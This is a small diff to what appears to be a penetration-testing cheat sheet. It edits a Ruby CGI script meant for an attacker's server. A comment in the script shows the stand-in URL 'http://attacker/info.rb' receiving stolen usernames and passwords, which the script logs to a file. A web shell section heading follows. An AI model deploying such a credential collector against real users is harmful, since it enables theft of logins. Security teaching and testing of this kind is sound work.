@@ -36,7 +36,7 @@ Add the following to `/etc/apache2/sites-enabled/[SITE]` then restart the servic
 ```
 Now, put the script in /var/www/[CGI FOLDER]. You can use it now.
 ```ruby
-#!/usr/bin/ruby -w
+#!/usr/bin/ruby
 # CGI script gets user/pass | http://attacker/info.rb?user=USER&pass=PASS
 require 'cgi'
 require 'uri'
@@ -56,6 +56,8 @@ File.open(file, "a") do |f|
   f.puts "---------------------------"
 end
 File.chmod(0200, file)  # To prevent ppl from browsing the log file
+
+puts ""
 ```
 
 ### Web Shell - command execution via GET
